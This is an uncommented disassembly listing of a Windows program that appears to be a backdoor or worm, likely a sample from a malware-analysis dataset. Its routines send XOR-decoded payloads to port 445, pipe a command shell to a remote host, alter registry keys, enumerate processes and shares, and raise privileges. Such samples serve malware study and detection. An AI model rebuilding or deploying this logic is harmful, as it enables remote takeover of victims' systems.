sub ecx edx
je r-xdata
push [ ebp - 0x4 ]
call ebx
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx 0x5
jne r-xdata
sub ecx edx
je r-xdata
push [ ebp + 0xc ]
call esi
add esp 0xc
push [ eax + 0xc ]
push ecx
jmp r-xdata
mov eax [ eax + 0xc ]
cmp eax edi
jne r-xdata
lea eax [ ebp - 0x48 ]
push eax
push rw-data
jmp r-xdata
lea eax [ ebp - 0x48 ]
sub ecx edx
push eax
je r-xdata
lea eax [ ebp - 0x48 ]
push eax
push rw-data
push [ ebp + 0xc ]
call esi
add esp 0x14
jmp r-xdata
cmp eax 0x1
jne r-xdata
lea eax [ ebp - 0x48 ]
push eax
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
test al 0x18
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x48 ]
push eax
push rw-data
jmp r-xdata
push eax
push 0x5
lea eax [ ebp - 0x48 ]
push eax
push rw-data
jmp r-xdata
sub_404b87
push ebp
mov ebp esp
sub esp 0x354
push ebx
push esi
push edi
push 0x22
pop ecx
mov esi rw-data
lea edi [ ebp - 0xc4 ]
push 0x2a
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop ecx
mov esi rw-data
lea edi [ ebp - 0x170 ]
push 0x37
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop ecx
mov esi rw-data
lea edi [ ebp - 0x250 ]
xor eax eax
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
xor [ ebp + eax - 0xc4 ] 0x93
inc eax
cmp eax 0x89
jb r-xdata
xor eax eax
xor [ ebp + eax - 0x170 ] 0x93
inc eax
cmp eax 0xa8
jb r-xdata
xor eax eax
xor [ ebp + eax - 0x250 ] 0x93
inc eax
cmp eax 0xde
jb r-xdata
push [ ebp + 0x8 ]
call [ gethostbyname@IAT ]
test eax eax
je r-xdata
push rw-data
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ inet_ntoa@IAT ]
push eax
jmp r-xdata
push 0x0
push 0x1
pop edi
push edi
push 0x2
pop ebx
push ebx
call [ socket@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call strcpy
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp - 0x38 ]
push eax
call strcpy
cmp [ ebp - 0x38 ] 0x0
pop ecx
pop ecx
jne r-xdata
push 0x1bd
mov [ ebp - 0x18 ] bx
call [ htons@IAT ]
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x38 ]
push eax
call [ inet_addr@IAT ]
mov [ ebp - 0x14 ] eax
push 0x8
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] edi
push eax
push 0x8004667e
push esi
call [ ioctlsocket@IAT ]
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x18 ]
push 0x10
push eax
push esi
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x350 ] esi
mov [ ebp - 0x354 ] edi
call [ connect@IAT ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x354 ]
push 0x0
push eax
lea eax [ esi + 0x1 ]
push 0x0
push eax
call [ select@IAT ]
test eax eax
jg r-xdata
lea eax [ ebp - 0x38 ]
push eax
push rw-data
push [ ebp + 0xc ]
call [ __import_lookup_table_3(MSVCRT:sprintf) ]
add esp 0xc
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push edi
lea eax [ ebp - 0x38 ]
push [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc4 ]
push 0x89
push eax
push esi
call sub_404d7a
add esp 0x18
test eax eax
je r-xdata
lea eax [ ebp - 0x38 ]
push eax
push rw-data
push [ ebp + 0xc ]
call [ __import_lookup_table_3(MSVCRT:sprintf) ]
add esp 0xc
jmp r-xdata
push ebx
lea eax [ ebp - 0x38 ]
push [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x170 ]
push 0xa8
push eax
push esi
call sub_404d7a
add esp 0x18
test eax eax
je r-xdata
push esi
call [ closesocket@IAT ]
push 0x3
lea eax [ ebp - 0x38 ]
push [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x250 ]
push 0xde
push eax
push esi
call sub_404d7a
add esp 0x18
sub_404d7a
push ebp
mov ebp esp
mov eax 0x1120
call sub_4057b0
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx [ ioctlsocket@IAT ]
push edi
push 0x1
pop edi
lea eax [ ebp - 0x4 ]
push eax
push 0x8004667e
push esi
mov [ ebp - 0x4 ] edi
call ebx
push 0x0
and [ ebp - 0x8 ] 0x0
push [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x2
mov [ ebp - 0x11c ] esi
mov [ ebp - 0x120 ] edi
push [ ebp + 0xc ]
push esi
call [ send@IAT ]
lea ecx [ ebp - 0xc ]
lea eax [ esi + 0x1 ]
push ecx
lea ecx [ ebp - 0x120 ]
push 0x0
push ecx
push 0x0
push eax
call [ select@IAT ]
test eax eax
jg r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
push eax
push 0x8004667e
push esi
call ebx
lea eax [ ebp - 0xc ]
xor ebx ebx
push eax
push ebx
lea eax [ ebp - 0x120 ]
push ebx
push eax
lea eax [ esi + 0x1 ]
push eax
mov [ ebp - 0xc ] 0x4
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x11c ] esi
mov [ ebp - 0x120 ] edi
call [ select@IAT ]
test eax eax
jle r-xdata
push [ ebp + 0x14 ]
push rw-data
jmp r-xdata
push [ ebp + 0x14 ]
push rw-data
push ebx
lea eax [ ebp - 0x1120 ]
push 0x640
push eax
push esi
call [ recv@IAT ]
cmp eax 0xffffffff
jne r-xdata
push [ ebp + 0x18 ]
call [ __import_lookup_table_3(MSVCRT:sprintf) ]
add esp 0xc
push esi
call [ closesocket@IAT ]
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x1c ] 0x3
jne r-xdata
mov eax edi
xor eax eax
lea ecx [ ebp - 0x10f0 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x1c ] dl
inc eax
inc ecx
inc ecx
cmp eax 0xc
jl r-xdata
and [ ebp + eax - 0x1c ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x14 ]
push rw-data
push [ ebp + 0x18 ]
call [ __import_lookup_table_3(MSVCRT:sprintf) ]
add esp 0x10
sub_404ec3
push ebp
mov ebp esp
sub esp 0x254
push ebx
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ __import_lookup_table_0(KERNEL32:GetProcAddress) ]
push esi
mov edi eax
call [ __import_lookup_table_0(KERNEL32:FreeLibrary) ]
push rw-data
push [ ebp + 0x8 ]
call [ __import_lookup_table_3(MSVCRT:strstr) ]
pop ecx
xor ebx ebx
test eax eax
pop ecx
jne r-xdata
push 0x44
lea eax [ ebp - 0x54 ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x24 ] bx
push eax
lea eax [ ebp - 0x54 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
push ebx
call [ CreateProcessA@IAT ]
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
lea eax [ ebp - 0x254 ]
push eax
call strcpy
mov esi [ strchr@IAT ]
lea eax [ ebp - 0x254 ]
push 0x22
push eax
call esi
add esp 0x10
cmp eax ebx
je r-xdata
inc eax
push 0x22
push eax
call esi
pop ecx
cmp eax ebx
pop ecx
je r-xdata
mov [ eax ] bl
lea eax [ ebp - 0x254 ]
push 0x5c
push eax
call [ __import_lookup_table_3(MSVCRT:strrchr) ]
pop ecx
cmp eax ebx
pop ecx
je r-xdata
cmp [ eax - 0x1 ] 0x3a
jne r-xdata
mov [ eax ] bl
mov [ eax + 0x1 ] bl
jmp r-xdata
lea eax [ ebp - 0x253 ]
push eax
call edi
sub_404f9e
push ecx
mov [ rw-data ] 0x4f
call sub_403c4e
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
pop ecx
retn
lea ecx [ esp ]
push ecx
push eax
push eax
push sub_404fcb
push eax
push eax
call [ CreateThread@IAT ]
sub_404fcb
push ebp
mov ebp esp
mov eax 0x1540
call sub_4057b0
push ebx
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ __import_lookup_table_0(KERNEL32:GetProcAddress) ]
push esi
mov [ ebp - 0x14 ] eax
call [ __import_lookup_table_0(KERNEL32:FreeLibrary) ]
push 0x1
xor esi esi
pop ebx
lea eax [ ebp - 0x2c ]
mov edi [ CreatePipe@IAT ]
or [ ebp - 0xc ] 0xffffffff
push esi
push eax
lea eax [ ebp - 0x1c ]
mov [ ebp - 0x8 ] esi
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ rw-data ] ebx
mov [ ebp - 0x2c ] 0xc
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] ebx
call edi
lea eax [ ebp - 0x2c ]
push esi
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call edi
push 0x44
lea eax [ ebp - 0x88 ]
push esi
push eax
call memset
mov eax [ ebp - 0x20 ]
add esp 0xc
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x4c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] 0x101
mov [ ebp - 0x34 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x88 ]
push eax
push esi
push esi
push esi
push ebx
push esi
lea eax [ ebp - 0x34 ]
push esi
push eax
push esi
mov [ ebp - 0x58 ] si
call [ CreateProcessA@IAT ]
mov ebx [ __import_lookup_table_0(KERNEL32:Sleep) ]
push 0x3e8
call ebx
call sub_4052f5
cmp eax esi
mov [ ebp - 0x4 ] eax
je r-xdata
push esi
push [ ebp - 0x44 ]
call [ ebp - 0x14 ]
push 0x1
mov [ rw-data ] esi
pop eax
pop edi
pop esi
pop ebx
leave
retn 0x4
cmp [ rw-data ] esi
je r-xdata
push rw-data
push rw-data
jmp r-xdata
cmp [ ebp - 0xc ] esi
jg r-xdata
lea eax [ ebp - 0x8 ]
push esi
push eax
lea eax [ ebp - 0x1540 ]
push [ ebp - 0x8 ]
push eax
push [ ebp - 0x10 ]
call [ __import_lookup_table_0(KERNEL32:ReadFile) ]
test eax eax
je r-xdata
lea eax [ ebp - 0x188 ]
push eax
call strcpy
pop ecx
lea eax [ ebp - 0x188 ]
pop ecx
push eax
call strlen
pop ecx
add eax 0x4
push eax
push 0x1
push rw-data
push 0x52
push [ rw-data ]
call [ inet_ntoa@IAT ]
push eax
lea eax [ ebp - 0xd40 ]
push eax
call sub_402482
lea eax [ ebp - 0xd40 ]
push eax
call strlen
mov edi eax
lea eax [ ebp - 0x188 ]
push eax
call strlen
mov [ ebp + edi - 0xd40 ] eax
lea eax [ ebp - 0x188 ]
push eax
add edi 0x4
call strlen
push eax
lea eax [ ebp - 0x188 ]
push eax
lea eax [ ebp + edi - 0xd40 ]
push eax
call memcpy
lea eax [ ebp - 0x188 ]
push eax
call strlen
add esp 0x34
add edi eax
lea eax [ ebp - 0xd40 ]
push esi
push edi
push eax
push [ ebp - 0x4 ]
call [ send@IAT ]
push 0x64
mov eax 0x7ff
cmp [ ebp - 0xc ] eax
ja r-xdata
push [ ebp - 0x4 ]
call sub_402583
cmp eax esi
pop ecx
je r-xdata
push [ ebp - 0x4 ]
call [ closesocket@IAT ]
cmp [ rw-data ] esi
je r-xdata
push esi
push eax
lea eax [ ebp - 0x1540 ]
push eax
push [ ebp - 0x4 ]
call [ recv@IAT ]
cmp eax esi
jle r-xdata
mov eax [ ebp - 0xc ]
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x4
push eax
push 0x1
push rw-data
push 0x52
push [ rw-data ]
call [ inet_ntoa@IAT ]
push eax
lea eax [ ebp - 0xd40 ]
push eax
call sub_402482
lea eax [ ebp - 0xd40 ]
push eax
call strlen
mov edi eax
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp + edi - 0xd40 ] eax
add edi 0x4
lea eax [ ebp - 0x1540 ]
push eax
lea eax [ ebp + edi - 0xd40 ]
push eax
call memcpy
add esp 0x28
add edi [ ebp - 0x8 ]
push [ ebp - 0x4 ]
or [ ebp - 0xc ] 0xffffffff
call [ closesocket@IAT ]
push 0x64
call ebx
call sub_4052f5
cmp eax esi
mov [ ebp - 0x4 ] eax
je r-xdata
sub [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
push esi
push ecx
push eax
lea eax [ ebp - 0x1540 ]
push eax
push [ ebp - 0x18 ]
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp eax 0x3e800
jge r-xdata
sub edi eax
cmp edi esi
jg r-xdata
push 0xa
jmp r-xdata
push [ ebp - 0x4 ]
call sub_405376
cmp eax 0xffffffff
pop ecx
mov [ ebp - 0xc ] eax
je r-xdata
push esi
lea eax [ ebp - 0xd40 ]
push edi
push eax
push [ ebp - 0x4 ]
call [ send@IAT ]
cmp eax esi
jl r-xdata
call ebx
push esi
lea eax [ ebp - 0x8 ]
push esi
push eax
lea eax [ ebp - 0x1540 ]
push 0x800
push eax
push [ ebp - 0x10 ]
call [ __import_lookup_table_0(KERNEL32:PeekNamedPipe) ]
cmp [ ebp - 0x8 ] esi
je r-xdata
sub_4052f5
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov esi [ rw-data ]
push 0x52
pop edi
push 0x0
push 0x1
push 0x2
call [ socket@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push edi
mov [ ebp - 0x10 ] 0x2
call [ htons@IAT ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x10 ]
push 0x10
push eax
push ebx
mov [ ebp - 0xc ] esi
call [ connect@IAT ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
push ebx
call [ closesocket@IAT ]
push rw-data
call [ inet_addr@IAT ]
mov edi [ rw-data ]
mov esi eax
sub_405376
push ebp
mov ebp esp
sub esp 0x10
push 0x0
lea eax [ ebp - 0x10 ]
push 0x4
push eax
push [ ebp + 0x8 ]
call [ recv@IAT ]
cmp eax 0x4
je r-xdata
mov eax [ ebp - 0x10 ]
leave
retn
or eax 0xffffffff
leave
retn
sub_40539c
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x5
pop edi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
lea ecx [ ebp - 0x4 ]
lea eax [ esi + 0x5 ]
push ecx
lea ecx [ edi - 0x5 ]
push eax
push ecx
push eax
mov [ esi + 0x1 ] edi
call sub_402635
push edi
push esi
call sub_401ed3
push esi
call [ free@IAT ]
add esp 0x1c
pop edi
pop esi
leave
retn
lea eax [ esi + 0x5 ]
mov [ esi ] 0x61
push eax
mov eax [ rw-data ]
lea ecx [ eax + 0x4 ]
push ecx
push [ eax ]
call sub_405515
lea edi [ eax + 0x5 ]
mov [ ebp - 0x4 ] eax
mov [ esi + edi ] 0x1
inc edi
lea eax [ esi + edi ]
push eax
mov eax [ rw-data ]
lea ecx [ eax + 0x4 ]
push ecx
push [ eax ]
call sub_405587
add esp 0x18
mov [ ebp - 0x4 ] eax
add edi eax
sub_40541f
mov eax [ rw-data ]
push esi
lea esi [ eax + 0x4 ]
push esi
call strlen
lea eax [ eax + esi + 0x1 ]
push eax
mov eax [ rw-data ]
push esi
push [ eax ]
call sub_405700
add esp 0x10
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_403c4e
pop esi
retn
sub_405457
mov eax [ rw-data ]
push esi
push edi
lea esi [ eax + 0x4 ]
push esi
call strlen
lea edi [ eax + esi + 0x1 ]
push edi
call strlen
push [ eax + edi + 0x5 ]
lea eax [ eax + edi + 0x1 ]
lea ecx [ eax + 0x8 ]
push ecx
push [ eax ]
mov eax [ rw-data ]
push edi
push esi
push [ eax ]
call sub_4056b1
add esp 0x20
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_403c4e
pop edi
pop esi
retn
sub_4054a5
mov eax [ rw-data ]
push esi
lea esi [ eax + 0x4 ]
push esi
call strlen
lea eax [ eax + esi + 0x1 ]
push eax
mov eax [ rw-data ]
push esi
push [ eax ]
call sub_405613
add esp 0x10
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_403c4e
pop esi
retn
sub_4054dd
mov eax [ rw-data ]
push esi
lea esi [ eax + 0x4 ]
push esi
call strlen
lea eax [ eax + esi + 0x1 ]
push eax
mov eax [ rw-data ]
push esi
push [ eax ]
call sub_40566d
add esp 0x10
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_403c4e
pop esi
retn
sub_405515
push ebp
mov ebp esp
push ecx
push ebx
lea eax [ ebp + 0xc ]
push esi
xor ebx ebx
push eax
push 0xf003f
push ebx
mov [ ebp - 0x4 ] ebx
push [ ebp + 0xc ]
xor esi esi
push [ ebp + 0x8 ]
call [ __import_lookup_table_1(ADVAPI32:RegOpenKeyExA) ]
test eax eax
je r-xdata
push edi
xor eax eax
jmp r-xdata
push [ ebp + 0xc ]
call [ RegCloseKey@IAT ]
mov eax esi
pop edi
push edi
call strlen
inc [ ebp - 0x4 ]
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x10 ]
push ebx
push ebx
push ebx
lea edi [ esi + eax ]
lea eax [ ebp + 0x8 ]
push ebx
push eax
push edi
mov [ ebp + 0x8 ] 0x104
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
call [ RegEnumKeyExA@IAT ]
test eax eax
jne r-xdata
sub_405587
push ebp
mov ebp esp
push ebx
lea eax [ ebp + 0x8 ]
push esi
xor esi esi
push eax
push 0xf003f
push esi
xor ebx ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ __import_lookup_table_1(ADVAPI32:RegOpenKeyExA) ]
test eax eax
je r-xdata
push edi
mov edi [ ebp + 0x10 ]
xor eax eax
jmp r-xdata
push [ ebp + 0x8 ]
call [ RegCloseKey@IAT ]
mov eax esi
pop edi
mov eax [ ebp + 0xc ]
inc ebx
mov [ esi + edi + 0x104 ] eax
mov eax [ ebp + 0xc ]
lea esi [ esi + eax + 0x108 ]
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
lea eax [ ebp + 0xc ]
mov [ ebp + 0x10 ] 0x100
push eax
lea eax [ edi + esi + 0x108 ]
push eax
lea eax [ edi + esi + 0x100 ]
push eax
lea eax [ ebp + 0x10 ]
push 0x0
push eax
lea eax [ esi + edi ]
mov [ ebp + 0xc ] 0x2800
push eax
push ebx
push [ ebp + 0x8 ]
call [ __import_lookup_table_1(ADVAPI32:RegEnumValueA) ]
test eax eax
jne r-xdata
sub_405613
push ebp
mov ebp esp
sub esp 0x20
lea eax [ ebp + 0xc ]
push eax
push 0xf003f
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ __import_lookup_table_1(ADVAPI32:RegOpenKeyExA) ]
test eax eax
je r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ __import_lookup_table_4(SHLWAPI:SHDeleteKeyA) ]
mov esi eax
lea eax [ ebp - 0x20 ]
push esi
push rw-data
push eax
call [ __import_lookup_table_3(MSVCRT:sprintf) ]
add esp 0xc
push [ ebp + 0xc ]
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
leave
retn
xor eax eax
leave
retn
sub_40566d
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push 0xf003f
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ __import_lookup_table_1(ADVAPI32:RegOpenKeyExA) ]
test eax eax
je r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ __import_lookup_table_1(ADVAPI32:RegDeleteValueA) ]
push [ ebp + 0xc ]
mov esi eax
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
pop ebp
retn
xor eax eax
pop ebp
retn
sub_4056b1
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push 0xf003f
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ __import_lookup_table_1(ADVAPI32:RegOpenKeyExA) ]
test eax eax
je r-xdata
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegSetValueExA@IAT ]
push [ ebp + 0xc ]
mov esi eax
call [ RegCloseKey@IAT ]
xor eax eax
test esi esi
sete al
pop esi
pop ebp
retn
xor eax eax
pop ebp
retn
sub_405700
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0xc ]
push edi
mov esi 0xf003f
push eax
xor edi edi
push esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ __import_lookup_table_1(ADVAPI32:RegOpenKeyExA) ]
test eax eax
je r-xdata
push ebx
lea eax [ ebp + 0x8 ]
push edi
push eax
push edi
push esi
push edi
push edi
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegCreateKeyExA@IAT ]
push [ ebp + 0xc ]
mov esi [ RegCloseKey@IAT ]
mov ebx eax
call esi
push [ ebp + 0x8 ]
call esi
xor eax eax
cmp ebx edi
sete al
pop ebx
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_4057b0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_405965
cmp [ rw-data ] ebx
jne r-xdata
call sub_405950
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_405962
call [ __import_lookup_table_3(MSVCRT:__setusermatherr) ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ __import_lookup_table_0(KERNEL32:GetStartupInfoA) ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ __import_lookup_table_0(KERNEL32:GetModuleHandleA) ]
push eax
call sub_401000
mov [ ebp - 0x68 ] eax
push eax
call [ __import_lookup_table_3(MSVCRT:exit) ]
sub_401041
mov eax r-xdata
retn
sub_4013c3
sub esp 0x190
lea eax [ esp ]
push eax
push 0x2
call [ WSAStartup@IAT ]
neg eax
sbb eax eax
inc eax
add esp 0x190
retn
sub_4026d1
push [ esp + 0x4 ]
call [ gethostbyname@IAT ]
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ inet_ntoa@IAT ]
retn
sub_40317a
xor eax eax
push eax
push eax
push eax
push [ esp + 0x14 ]
push eax
push [ esp + 0x18 ]
call [ AdjustTokenPrivileges@IAT ]
retn
sub_4036c9
mov eax [ rw-data ]
push [ eax ]
call sub_403688
neg eax
sbb al al
pop ecx
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_403c4e
sub_40372a
mov eax [ rw-data ]
push [ eax ]
call sub_4036e8
neg eax
sbb al al
pop ecx
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_403c4e
sub_403749
push [ rw-data ]
call sub_404ec3
neg eax
sbb al al
pop ecx
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_403c4e
sub_4038e8
push 0x0
push [ rw-data ]
call [ __import_lookup_table_0(KERNEL32:CreateDirectoryA) ]
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_403c4e
sub_4042ba
mov eax [ rw-data ]
lea ecx [ eax + 0x4 ]
push ecx
push [ eax ]
call sub_404161
pop ecx
pop ecx
retn
sub_4043d2
push 0x200
push [ rw-data ]
call [ GetWindowsDirectoryA@IAT ]
push rw-data
push [ rw-data ]
call strcat
push 0x4f
call sub_4042cd
add esp 0xc
retn
sub_404eac
push 0x0
push rw-data
call sub_401562
pop ecx
pop ecx
push 0x1
call [ ExitProcess@IAT ]
SetSecurityInfo
jmp [ SetSecurityInfo@IAT ]
SetEntriesInAclA
jmp [ SetEntriesInAclA@IAT ]
WNetCloseEnum
jmp [ WNetCloseEnum@IAT ]
WNetEnumResourceA
jmp [ __import_lookup_table_2(MPR:WNetEnumResourceA) ]
WNetOpenEnumA
jmp [ __import_lookup_table_2(MPR:WNetOpenEnumA) ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_EH_prolog
jmp [ _EH_prolog@IAT ]
strcat
jmp [ strcat@IAT ]
strcpy
jmp [ __import_lookup_table_3(MSVCRT:strcpy) ]
strlen
jmp [ __import_lookup_table_3(MSVCRT:strlen) ]
memset
jmp [ __import_lookup_table_3(MSVCRT:memset) ]
memcpy
jmp [ __import_lookup_table_3(MSVCRT:memcpy) ]
strcmp
jmp [ __import_lookup_table_3(MSVCRT:strcmp) ]
_XcptFilter
jmp [ __import_lookup_table_3(MSVCRT:_XcptFilter) ]
_initterm
jmp [ _initterm@IAT ]
sub_405950
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_405962
xor eax eax
retn
sub_405965
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ __import_lookup_table_0(KERNEL32:Process32First) ]
CreateToolhelp32Snapshot
jmp [ __import_lookup_table_0(KERNEL32:CreateToolhelp32Snapshot) ]
sub_405994
mov eax r--data
jmp __CxxFrameHandler
